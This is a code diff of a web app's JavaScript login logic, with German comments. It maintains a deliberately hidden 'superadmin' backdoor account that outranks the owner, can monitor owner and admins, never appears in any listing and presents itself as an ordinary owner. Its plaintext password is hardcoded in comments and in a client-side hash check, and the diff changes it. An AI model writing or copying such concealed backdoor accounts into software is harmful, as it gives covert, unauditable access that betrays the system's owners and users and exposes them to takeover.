@@ -1322,9 +1322,9 @@ const DEFAULT_PW = 'd20c5c90b1527b6b608d751ff832e401c74833b211702f77c9f951ba68a4
 /* ═══════════════════════════════════════════════════════════════════════
    SUPEROWNER — Verstecktes God-Konto (über Owner, für alle unsichtbar)
    Benutzername: superadmin
-   Passwort: MNC_SUPER_2026!  ← NUR DU KENNST DAS
+   Passwort: MNCSUPER2026!
    Rechte: ALLE — kann Owner/Admin überwachen, sieht alles, wird nirgends angezeigt
-   Passwort ändern: Zeile mit sha256('MNC_SUPER_2026!') unten im doLg() anpassen
+   Passwort ändern: Zeile mit sha256('MNCSUPER2026!') unten im doLg() anpassen
    ══════════════════════════════════════════════════════════════════════ */
 const SUPEROWNER_USER = 'superadmin';
 /* ── ROLE DATA — Firebase als einzige Wahrheit ──────────────────────── */
@@ -1536,7 +1536,7 @@ async function doLg(){
   // SUPEROWNER — verstecktes God-Konto (unsichtbar für alle)
   if(u === SUPEROWNER_USER){
     // Hash live berechnen und mit gespeichertem Wert vergleichen
-    const correctHash = await sha256('MNC_SUPER_2026!'); // ← Passwort hier ändern
+    const correctHash = await sha256('MNCSUPER2026!'); // Superadmin Passwort
     if(ph === correctHash){
       applyRole('owner','Owner'); // Sieht für alle wie normaler Owner aus
       startSession('owner','Owner');
@@ -1556,17 +1556,21 @@ async function doLg(){
     return;
   }
 
-  // Owner: immer zuerst aus Firebase laden, dann vergleichen
+  // Owner Login — Firebase ist die Wahrheit
   if(u==='owner'){
-    let d = getRD();
-    // Firebase zuerst abfragen (damit geändertes Passwort sofort gilt)
+    let d = {op: DEFAULT_PW, adm:[]};
+    // Immer zuerst aus Firebase laden
     if(_fbOnline){
       try{
         const fb = await fbRead(FB_PATH.roles);
-        if(fb && fb.op){ d = fb; localStorage.setItem(RK, JSON.stringify(fb)); }
+        if(fb && isHash(fb.op)){ d = fb; localStorage.setItem(RK, JSON.stringify(fb)); }
       }catch{}
+    } else {
+      // Offline: aus Cache lesen
+      const cached = getRD();
+      if(cached && isHash(cached.op)) d = cached;
     }
-    const stored = isHash(d.op) ? d.op : DEFAULT_PW;
+    const stored = d.op; // immer ein gültiger Hash
     if(ph === stored){
       applyRole('owner','Owner');
       startSession('owner','Owner');
